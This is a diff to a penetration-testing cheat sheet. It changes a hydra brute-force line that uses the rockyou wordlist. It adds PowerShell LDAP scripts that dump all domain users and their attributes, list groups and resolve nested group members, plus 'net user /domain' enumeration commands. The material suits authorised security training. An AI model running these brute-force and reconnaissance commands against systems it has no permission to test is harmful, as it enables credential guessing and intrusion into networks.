@@ -595,7 +595,7 @@ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR
 ## hydra
 ```
 hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
-hydra -l offsec -P /usr/share/wordlists/rockyou.txt 192.168.150.52 http-get
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-get
 # specify number of threads with -t to avoid getting blocked
 hydra -l user -P wordlist ssh://10.10.10.10 -f -V -t 3
 ```
@@ -757,6 +757,85 @@ ntlmrelayx.py -6 -t ldaps://192.168.92.130 -wh fakewpad.whiterose.local -l outfi
 :information_source: ``` --delegate-access ``` 
 
 # Active Directory Enumeration
+## Collect all users with their attributes
+For more information about samAccountTypes see this [link](https://docs.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype?redirectedfrom=MSDN)
+```
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+$PDC = ($domainObj.PdcRoleOwner).Name
+
+$SearchString = "LDAP://"
+
+$SearchString += $PDC + "/"
+
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+
+$SearchString += $DistinguishedName
+
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+
+$Searcher.SearchRoot = $objDomain
+
+$Searcher.filter="samAccountType=805306368"
+
+$Result = $Searcher.FindAll()
+
+Foreach($obj in $Result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop
+    }
+    
+    Write-Host "------------------------"
+} 
+
+```
+## Resolving Nested Groups
+Print names of all the groups
+```
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+$PDC = ($domainObj.PdcRoleOwner).Name
+
+$SearchString = "LDAP://"
+
+$SearchString += $PDC + "/"
+
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
+
+$SearchString += $DistinguishedName
+
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
+
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry
+
+$Searcher.SearchRoot = $objDomain
+
+$Searcher.filter="(objectClass=Group)"
+
+$Result = $Searcher.FindAll()
+
+Foreach($obj in $Result)
+{
+    $obj.Properties.name
+}
+
+```
+Assuming we found group XY. Replace the last 8 lines with:
+```
+$Searcher.filter="(name=XY)"
+
+$Result = $Searcher.FindAll()
+
+Foreach($obj in $Result)
+{
+    $obj.Properties.member
+}
+```
+
 
 ## PowerView
 
@@ -1121,7 +1200,10 @@ whoami
 whoami /priv
 whoami /groups
 net user 
+net user /domain
 net user Administrator
+net user jim /domain
+net group /domain
 net localgroup
 net localgroup Administrators
 ```
